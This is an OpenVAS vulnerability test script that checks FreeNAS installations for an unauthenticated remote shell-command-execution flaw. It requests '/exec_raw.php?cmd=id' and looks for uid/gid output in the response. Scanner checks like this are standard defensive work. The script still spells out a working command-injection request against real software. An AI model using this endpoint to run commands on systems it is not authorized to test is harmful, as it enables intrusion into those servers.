###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freenas_44974.nasl 14 2013-10-27 12:33:37Z jan $
#
# FreeNAS Remote Shell Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "FreeNAS is prone to a shell-command-execution vulnerability because
the application fails to properly sanitize user-supplied input.

An attacker can exploit the remote shell-command-execution issue
to execute arbitrary shell commands in the context of the
webserver process.

FreeNAS versions prior to 0.7.2 rev.5543 are vulnerable.";


if (description)
{
 script_id(100912);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-11-19 13:40:50 +0100 (Fri, 19 Nov 2010)");
 script_bugtraq_id(44974);
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_name("FreeNAS Remote Shell Command Execution Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44974");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/freenas/");

 script_tag(name:"risk_factor", value:"Critical");
 script_description(desc);
 script_summary("Determine if FreeNAS is prone to a shell-command-execution vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_freenas_detect.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"freenas"))exit(0);

ex = "id";
url = string(dir, "/exec_raw.php?cmd=",ex); 

  if(http_vuln_check(port:port,url:url,pattern:"uid=[0-9]+.*gid=[0-9]+.*")) {
     
    security_hole(port:port);
    exit(0);

  }

exit(0);
